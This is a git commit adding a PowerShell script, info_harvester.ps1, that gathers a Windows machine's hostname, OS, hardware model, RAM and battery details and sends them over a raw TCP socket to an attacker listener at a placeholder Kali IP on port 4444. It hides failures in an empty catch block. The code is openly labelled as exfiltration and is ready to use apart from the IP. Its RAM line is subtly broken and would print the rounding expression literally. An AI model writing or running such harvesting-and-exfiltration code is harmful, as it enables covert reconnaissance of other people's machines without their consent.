97cbfe283b197f6f705eb0843409ed3b17f45c5a
Surya <nitrodead22@gmail.com>
2026-01-31 19:48:03 +0530

    Create info_harvester.ps1

---
+++ info_harvester.ps1
@@ -0,0 +1,34 @@
+# This script gathers system information and sends it to a listener.
+
+# --- Configuration ---
+$ListenerIP = "YOUR_KALI_IP" # <-- IMPORTANT: Change this to your Kali's IP address
+$ListenerPort = "4444"       # <-- IMPORTANT: Change this to your listener's port
+
+# --- Information Gathering ---
+$computerInfo = Get-ComputerInfo
+$osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
+$batteryInfo = Get-CimInstance -ClassName Win32_Battery
+
+$report = @"
+--- SYSTEM REPORT ---
+Hostname: $($computerInfo.CsName)
+OS: $($osInfo.Caption) $($osInfo.Version)
+Manufacturer: $($computerInfo.CsManufacturer)
+Model: $($computerInfo.CsModel)
+Total RAM (GB): [math]::Round($($computerInfo.TotalPhysicalMemory / 1GB), 2)
+Battery Status: $($batteryInfo.BatteryStatus)
+Battery Charge (%): $($batteryInfo.EstimatedChargeRemaining)
+-------------------------
+"@
+
+# --- Exfiltration ---
+try {
+    $client = New-Object System.Net.Sockets.TCPClient($ListenerIP, $ListenerPort)
+    $stream = $client.GetStream()
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.WriteLine($report)
+    $writer.Flush()
+    $client.Close()
+} catch {
+    # Failed to connect to listener
+}
